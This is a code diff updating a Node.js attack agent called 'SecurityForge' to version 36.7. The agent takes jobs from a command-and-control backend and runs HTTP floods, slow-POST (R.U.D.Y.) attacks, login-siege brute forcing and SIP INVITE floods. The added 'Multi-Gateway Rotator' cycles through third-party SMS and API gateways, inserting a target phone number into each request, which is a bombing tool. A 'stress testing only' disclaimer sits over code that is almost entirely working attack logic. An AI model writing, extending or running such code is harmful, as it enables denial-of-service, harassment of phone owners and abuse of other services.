@@ -1,5 +1,5 @@
 /**
- * SECURITYFORGE AGENT V36.6 (GATEWAY EDITION)
+ * SECURITYFORGE AGENT V36.7 (GATEWAY ROTATOR EDITION)
  * 
  * [MODULES]
  * - L7 HTTP STRESS: Pulse Wave, Magma, Chaos Vortex, God Mode.
@@ -7,7 +7,7 @@
  * - RECON: Port Scanning, Admin Hunter.
  * - IOT: MQTT, RTSP, CoAP, Modbus.
  * - GHOST: SIP (VoIP), ADB, Printer.
- * - GATEWAY: SMS API Stress, VoIP Trunk Stress.
+ * - GATEWAY: SMS API Stress, VoIP Trunk Stress, Multi-Gateway Rotator.
  * 
  * [DISCLAIMER]
  * This software is for authorized infrastructure stress testing only.
@@ -75,7 +75,7 @@ const MALICIOUS_PAYLOADS = {
       const tag = Math.random().toString(36).substring(7);
       const callId = Math.random().toString(36).substring(7) + '@securityforge.io';
       const toUser = targetNumber || 'stress';
-      return `INVITE sip:${toUser}@${ip} SIP/2.0\r\nVia: SIP/2.0/UDP 10.0.0.1:5060;branch=${branch}\r\nFrom: <sip:ghost@securityforge.io>;tag=${tag}\r\nTo: <sip:${toUser}@${ip}>\r\nCall-ID: ${callId}\r\nCSeq: 1 INVITE\r\nMax-Forwards: 70\r\nUser-Agent: SecurityForge/V36.6\r\nContent-Length: 0\r\n\r\n`;
+      return `INVITE sip:${toUser}@${ip} SIP/2.0\r\nVia: SIP/2.0/UDP 10.0.0.1:5060;branch=${branch}\r\nFrom: <sip:ghost@securityforge.io>;tag=${tag}\r\nTo: <sip:${toUser}@${ip}>\r\nCall-ID: ${callId}\r\nCSeq: 1 INVITE\r\nMax-Forwards: 70\r\nUser-Agent: SecurityForge/V36.7\r\nContent-Length: 0\r\n\r\n`;
   }
 };
 
@@ -85,7 +85,7 @@ const MALICIOUS_PAYLOADS = {
 const PORT = process.env.PORT || 3000;
 http.createServer((req, res) => { 
     res.writeHead(200); 
-    res.end('SecurityForge Agent V36.6 ONLINE\nStatus: WAITING FOR C2'); 
+    res.end('SecurityForge Agent V36.7 ONLINE\nStatus: WAITING FOR C2'); 
 })
 .listen(PORT, () => console.log(`[SYSTEM] Agent listening on port ${PORT}`));
 
@@ -123,7 +123,7 @@ const supabaseRequest = (method, pathStr, body = null) => {
     });
 };
 
-console.log('\x1b[36m[AGENT] Initialized V36.6 (Gateway Edition). Waiting for commands...\x1b[0m');
+console.log('\x1b[36m[AGENT] Initialized V36.7 (Gateway Edition). Waiting for commands...\x1b[0m');
 
 // ==========================================
 // GLOBAL STATE
@@ -204,6 +204,15 @@ const startAttack = (job) => {
         let calibrationDone = false;
         let failSize = 0;
         let failStatus = 0;
+        
+        // Pre-parse Gateways if Multi-Mode
+        let multiGateways = [];
+        if (job.use_multi_gateway) {
+            try {
+                multiGateways = JSON.parse(job.body);
+                if (!Array.isArray(multiGateways)) multiGateways = [];
+            } catch(e) { console.error('Gateway Parse Error', e); }
+        }
 
         // ==========================================
         // MODULE: GHOST / IOT / GATEWAY
@@ -352,20 +361,47 @@ const startAttack = (job) => {
                     return setTimeout(performRequest, 100); 
                 }
 
-                const isHttps = targetUrl.protocol === 'https:';
-                const lib = isHttps ? https : http;
-                const agent = isHttps ? httpsAgent : httpAgent;
-                
-                const start = Date.now();
-                let body = job.body;
+                // -----------------------------------
+                // MULTI-GATEWAY LOGIC (The Rotator)
+                // -----------------------------------
+                let currentUrl = targetUrl;
                 let method = job.method || 'GET';
-                let creds = null;
-
-                const headers = {
+                let body = job.body;
+                let headers = {
                     'User-Agent': USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)],
                     'Content-Type': 'application/json',
                     ...((typeof job.headers === 'string' ? {} : job.headers) || {})
                 };
+
+                if (job.use_multi_gateway && multiGateways.length > 0) {
+                    // Pick next gateway (Round Robin or Random)
+                    const gw = multiGateways[totalRequests % multiGateways.length];
+                    try {
+                        const urlStr = gw.url.replace('$TARGET', job.target);
+                        currentUrl = new URL(urlStr);
+                        method = gw.method || 'GET';
+                        // Merge headers, allow specific gateway override
+                        if(gw.headers) Object.assign(headers, gw.headers);
+                        // Inject User Agent if missing
+                        if(!headers['User-Agent']) headers['User-Agent'] = USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
+                        
+                        if (gw.body) {
+                            body = typeof gw.body === 'string' 
+                                ? gw.body.replace('$TARGET', job.target) 
+                                : JSON.stringify(gw.body).replace('$TARGET', job.target);
+                        }
+                    } catch(e) {
+                        totalRequests++; // Skip malformed
+                        return setImmediate(performRequest);
+                    }
+                }
+
+                const isHttps = currentUrl.protocol === 'https:';
+                const lib = isHttps ? https : http;
+                const agent = isHttps ? httpsAgent : httpAgent;
+                const start = Date.now();
+                
+                let creds = null;
 
                 if (job.use_chaos || job.use_god_mode) {
                     headers['X-Chaos-ID'] = crypto.randomBytes(4).toString('hex');
@@ -373,8 +409,8 @@ const startAttack = (job) => {
                     headers['Referer'] = 'https://google.com?q=' + crypto.randomBytes(4).toString('hex');
                 }
 
-                // SMS GATEWAY FLOOD (POST Stress)
-                if (job.use_sms_flood) {
+                // SMS GATEWAY FLOOD (Single Mode)
+                if (job.use_sms_flood && !job.use_multi_gateway) {
                     method = 'POST';
                     if (job.use_form_data) {
                          headers['Content-Type'] = 'application/x-www-form-urlencoded';
@@ -396,7 +432,7 @@ const startAttack = (job) => {
                 if (job.use_login_siege) {
                     if (!calibrationDone) {
                          method = 'POST'; body = JSON.stringify({u:'bad',p:'bad'});
-                         const req = lib.request(targetUrl, { method, agent, headers }, (res) => {
+                         const req = lib.request(currentUrl, { method, agent, headers }, (res) => {
                              failStatus = res.statusCode; 
                              failSize = parseInt(res.headers['content-length']||'0');
                              calibrationDone = true;
@@ -415,7 +451,7 @@ const startAttack = (job) => {
                 // R.U.D.Y.
                 if (job.use_rudy) {
                     headers['Content-Length'] = 10000;
-                    const req = lib.request(targetUrl, { method: 'POST', agent, headers }, (res) => { res.resume(); });
+                    const req = lib.request(currentUrl, { method: 'POST', agent, headers }, (res) => { res.resume(); });
                     req.on('error', () => {});
                     const interval = setInterval(() => {
                         if(!running) { clearInterval(interval); req.destroy(); return; }
@@ -426,7 +462,7 @@ const startAttack = (job) => {
                 }
 
                 // STANDARD EXECUTION
-                const req = lib.request(targetUrl, { method, agent, headers, setNoDelay: true }, (res) => {
+                const req = lib.request(currentUrl, { method, agent, headers, setNoDelay: true }, (res) => {
                     const latency = Date.now() - start;
                     let isSuccess = false;
                     
